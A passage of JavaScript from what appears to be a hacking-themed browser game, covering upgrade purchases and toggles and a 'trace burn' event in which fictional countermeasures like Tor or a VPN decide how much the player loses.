    log(`> ENABLED: ${u.name}`,'ok');
    if(id==='type3')startAutoTick();
  } else {
    u.revert?.(); // turning OFF
    log(`> DISABLED: ${u.name} — bought but inactive`,'dim');
    if(id==='type3'){clearInterval(autoInt);autoInt=null;}
  }
  playOK(); updateUI(); renderPanel('upgrades');
}

function buyUpg(id){
  const u=UPG.find(u=>u.id===id); if(!u)return;
  const lvl=G.upgrades[id]||0; if(lvl>=u.mx)return;
  if(!u.cond()){log('> Prerequisites not met.','warn');return;}
  const cost=u.cost(lvl);
  if(G.credits<cost){log(`> Need $${fmtNum(cost)}`,'warn');playFail();return;}
  G.credits-=cost; G.upgrades[id]=lvl+1;
  // Toggleable upgrades start enabled on purchase
  if(u.toggle){if(!G.activeUpgrades)G.activeUpgrades={};G.activeUpgrades[id]=true;}
  u.apply();
  log(`> INSTALLED: ${u.name}`,'ok'); playOK(); updateUI(); renderPanel('upgrades');
}

function hasActiveCountermeasures(){
  // Player is "protected" if they have any active network defenses or charges
  if(isUpgradeActive('lat2')||isUpgradeActive('lat3'))return 'strong'; // Tor/Dark Proxy
  if(isUpgradeActive('lat1'))return 'weak';                             // VPN only
  if(G.burnerProxyCharges>0)return 'weak';                             // burner proxy
  if(isUpgradeActive('dec1'))return 'weak';                            // decoy server
  return false;
}

function triggerTraceBurn(){
  playFail(); abortMission();
  el('app').classList.add('glitch'); setTimeout(()=>el('app').classList.remove('glitch'),600);
  const protection=hasActiveCountermeasures();

  if(protection==='strong'){
    // NARROW ESCAPE — Tor/Dark Proxy saved them
    G.trace=getTraceFloor()+5;
    updateTraceBar();
    G.rep=parseFloat((G.rep+0.1).toFixed(1));
    logSep();
    log('> ⚠ TRACE COMPLETE — close call','err');
    log('> Tor routing absorbed the burn. Alias intact.','warn');
    log('> Countermeasures held. +REP ×0.1','ok');
    logSep();
    logMsg('v01d: That was close. Too close. They almost had you. Your routing held — barely.','void');
    G.msgUnread=true; el('msg-badge').style.display='inline';
    updateUI(); save();
  } else if(protection==='weak'){
    // PARTIAL ESCAPE — VPN/decoy bought time, costs a charge or forces scrub
    G.trace=getTraceFloor()+20;
    updateTraceBar();
    if(G.burnerProxyCharges>0){G.burnerProxyCharges--;log('> Burner proxy consumed to absorb trace.','warn');}
    logSep();
    log('> ⚠ TRACE SPIKE — partially contained','err');
    log('> Alias exposed briefly. VPN scrambled the signal.','warn');
    log('> You need to go dark. Stop operating for a while.','dim');
    logSep();
    // Lose some nodes as exposure cost
    const ownedRand=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status==='owned'&&v.random);
    if(ownedRand.length>0){
      const[lk,lv]=ownedRand[rnd(0,ownedRand.length-1)];
      G.networkNodes[lk].status='scanned';
      log(`> NODE LOST: ${lv.name} — feds traced the connection`,'err');
    }
    updateUI(); save();
    // Show modal warning with option to do manual burn
    showBurnWarningModal(false);
  } else {
    // NO PROTECTION — forced soft burn
    G.trace=100; updateTraceBar();
    logSep();
    log('> ⚠ TRACE COMPLETE — IDENTITY COMPROMISED','err');
    log('> No countermeasures. They have everything.','err');
    log('> Initiating emergency identity wipe...','warn');
    logSep();
    logMsg('v01d: They got you. Not all the way — I pulled the emergency brake. New alias. New start. Same instincts.','void');
    G.msgUnread=true; el('msg-badge').style.display='inline';
    setTimeout(()=>showBurnWarningModal(true), 800);
  }
}
